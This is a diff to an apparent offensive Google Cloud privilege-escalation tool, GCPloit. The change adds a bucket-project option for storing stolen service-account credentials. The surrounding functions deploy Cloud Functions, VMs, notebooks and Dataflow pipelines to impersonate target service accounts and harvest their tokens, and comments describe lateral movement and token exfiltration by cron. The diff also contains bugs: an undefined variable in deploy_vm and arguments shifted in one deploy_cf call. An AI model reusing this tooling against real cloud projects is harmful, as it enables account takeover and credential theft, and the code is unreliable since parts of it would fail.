@@ -31,7 +31,7 @@ def list_objects():
         print(cloud_object)
 
 
-def deploy_cf(project, source=None, target=None, role="unknown"):
+def deploy_cf(project, source=None, target=None, role="unknown", bucket=None, bucketproj=None):
     with open("./base_cloud_function/main.py") as f:
         latest_cf = f.read()
     utils.run_gcloud_command_local("gcloud config set project {}".format(project))
@@ -49,7 +49,7 @@ def deploy_cf(project, source=None, target=None, role="unknown"):
         creator_email = ""
     else:
         source = db_session.query(models.CloudObject).filter_by(name=source).first()
-        source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc)
+        source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc, bucket_name=bucket, bucket_proj=bucketproj)
         caller_identity = source.identity
         token = source.cred
         proc = activate_sketch_proxy(token)
@@ -67,7 +67,7 @@ def deploy_cf(project, source=None, target=None, role="unknown"):
     return fun_cloud_function
 
 
-def deploy_notebook(project, source=None, target=None, bucket=None, role="unknown"):
+def deploy_notebook(project, source=None, target=None, bucket=None, role="unknown", bucketproj=None):
     # Create instance via notebook notebooks in default network
     # SSH commands via vm for lateral movementa
     # cron job pulls token every minute and pushes up
@@ -87,7 +87,7 @@ def deploy_notebook(project, source=None, target=None, bucket=None, role="unknow
         creator_email = ""
     else:
         source = db_session.query(models.CloudObject).filter_by(name=source).first()
-        source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc, bucket_name=bucket)
+        source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc, bucket_name=bucket, bucket_proj=bucketproj)
         caller_identity = source.identity
         token = source.cred
         proc = activate_sketch_proxy(token)
@@ -106,7 +106,7 @@ def deploy_notebook(project, source=None, target=None, bucket=None, role="unknow
     print("successfully privesced the {} identitiy".format(target))
     return fun_notebook_instance
 
-def deploy_pipeline(project, source=None, target=None, bucket=None, role="unknown"):
+def deploy_pipeline(project, source=None, target=None, bucket=None, role="unknown", bucketproj=None):
     # Create instance via notebook notebooks in default network
     # SSH commands via vm for lateral movementa
     # cron job pulls token every minute and pushes up
@@ -145,7 +145,7 @@ def deploy_pipeline(project, source=None, target=None, bucket=None, role="unknow
     print("successfully privesced the {} identitiy".format(target))
     return fun_pipeline_instance
 
-def deploy_vm(project, source=None, target=None, bucket=None, role="unknown"):
+def deploy_vm(project, source=None, target=None, bucket=None, role="unknown", bucketproj=None):
     # Create instance in default network
     # SSH commands via vm for lateral movementa
     # cron job pulls token every minute and pushes up
@@ -165,7 +165,7 @@ def deploy_vm(project, source=None, target=None, bucket=None, role="unknown"):
         creator_email = ""
     else:
         source = db_session.query(models.CloudObject).filter_by(name=source).first()
-        source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc, bucket_name=bucket)
+        source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc, bucket_name=bucket, bucket_proj=bucket_proj)
         caller_identity = source.identity
         token = source.cred
         proc = activate_sketch_proxy(token)
@@ -234,7 +234,7 @@ def deactivate_sketch_proxy(proxy_proc):
     utils.run_gcloud_command_local("gcloud config unset core/custom_ca_certs_file")
 
 
-def run_cmd_on_source(name, cmd, project=None, bucket=None):
+def run_cmd_on_source(name, cmd, project=None, bucket=None, bucketproj=None):
     if cmd.startswith("gcloud"):
         cmd = cmd
     else:
@@ -242,7 +242,7 @@ def run_cmd_on_source(name, cmd, project=None, bucket=None):
     if project:
         cmd += " --project {}".format(project)
     source = db_session.query(models.CloudObject).filter_by(name=name).first()
-    source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc, bucket_name=bucket)
+    source.refresh_cred(db_session, utils.run_gcloud_command_local, dataproc=dataproc, bucket_name=bucket, bucket_proj=bucketproj)
     token = source.cred
     proxy_thread = activate_sketch_proxy(token)
     result = utils.run_gcloud_command_local(cmd)
@@ -270,6 +270,8 @@ def main():
                     help='what actAs vector you would like to use.')
     parser.add_argument('--bucket', dest='bucket',
                     help='bucket for GCPloit credential storage.')
+    parser.add_argument('--bucket_proj', dest='bucketproj',
+                    help='project containing bucket for GCPloit credential storage.')
 
     args = parser.parse_args()
 
@@ -282,7 +284,7 @@ def main():
             return_output = utils.run_gcloud_command_local(args.gcloud_cmd)
             print(return_output)
         else:
-            return_output = run_cmd_on_source(args.source, args.gcloud_cmd, project=args.project, bucket=args.bucket)
+            return_output = run_cmd_on_source(args.source, args.gcloud_cmd, project=args.project, bucket=args.bucket, bucketproj=args.bucketproj)
             print(return_output)
     elif args.exploit:
         if not args.project:
@@ -312,22 +314,22 @@ def main():
                     if args.actasmethod == "cf":
                         new_object = deploy_cf(args.project, args.source, service_account["email"])
                     if args.actasmethod == "vm":
-                        new_object = deploy_vm(args.project, args.source, service_account["email"], args.bucket)
+                        new_object = deploy_vm(args.project, args.source, service_account["email"], args.bucket, args.bucketproj)
                     if args.actasmethod == "notebook":
-                        new_object = deploy_notebook(args.project, args.source, service_account["email"], args.bucket)
+                        new_object = deploy_notebook(args.project, args.source, service_account["email"], args.bucket, args.bucketproj)
                     if args.actasmethod == "dataflow":
-                        new_object = deploy_pipeline(args.project, args.source, service_account["email"], args.bucket)
+                        new_object = deploy_pipeline(args.project, args.source, service_account["email"], args.bucket, args.bucketproj)
                     print("~~~~~~~Got New Identity~~~~~~~~")
                     print(new_object)
             else:
                 if args.actasmethod == "cf":
-                    new_object = deploy_cf(args.project, args.source, args.target)
+                    new_object = deploy_cf(args.project, args.source, args.target, args.bucket, args.bucketproj)
                 if args.actasmethod == "vm":
-                    new_object = deploy_vm(args.project, args.source, args.target, args.bucket)
+                    new_object = deploy_vm(args.project, args.source, args.target, args.bucket, args.bucketproj)
                 if args.actasmethod == "notebook":
-                    new_object = deploy_notebook(args.project, args.source, args.target, args.bucket)
+                    new_object = deploy_notebook(args.project, args.source, args.target, args.bucket, args.bucketproj)
                 if args.actasmethod == "dataflow":
-                    new_object = deploy_pipeline(args.project, args.source, args.target, args.bucket)
+                    new_object = deploy_pipeline(args.project, args.source, args.target, args.bucket, args.bucketproj)
                 if new_object:
                     print("~~~~~~~Got New Identity~~~~~~~~")
                     print(new_object)
